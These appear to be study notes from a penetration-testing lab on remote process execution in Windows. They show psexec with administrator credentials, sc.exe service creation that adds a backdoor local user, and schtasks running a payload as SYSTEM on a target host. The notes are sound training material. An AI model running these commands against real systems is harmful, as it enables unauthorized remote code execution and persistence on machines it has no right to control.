# Spawning Processes Remotely Knowledge

## Psexec
Ports: 445/TCP (SMB)  
Required Group Membership: Administrators

- Allows for the execution of processes on remote systems
- To run psexec, we need to supply the required administrator credentials for the remote host

<pre>psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</pre>

## Remotely Creating Services - sc.exe
Ports:  
- 135/TCP, 49152-65535/TCP (DCE/RPC)  
- 445/TCP (RPC over SMB Named Pipes)
- 139/TCP (RPC over SMB Named Pipes)  

Required Group Memberships: Administrators  

Windows services can be used to run arbirary commands since they execute a command when started. While a service executable is different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create and start a service named `THMservice` on a remote machine using `sc.exe`:
<pre>sc.exe \\TARGET create THMservice binPath= "net user User1 Pass123 /add" start= auto</pre>
<pre>sc.exe \\TARGET start THMservice</pre>
- `net user` command will be executed when the service is started, creating a new local user on the system
- Unable to view the command output

To stop and delete the service:
<pre>sc.exe \\TARGET stop THMservice</pre>
<pre>sc.exe \\TARGET delete THMservice</pre>

## Creating Scheduled Tasks Remotely
<pre>schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "command/payload to execute" /sc ONCE /sd 01/01/1970 /st 00:00</pre>
<pre>schtasks /s TARGET /run /TN "THMtask1"</pre>

- Scheduled type `/sc` is set to ONCE (task is intended to run only once after the specified time and date)
- Output of the command wont be available to view (blind attack)  

Delete the scheduled task:
<pre>schtasks /S TARGET /TN "THMtask1" /DELETE /F</pre>
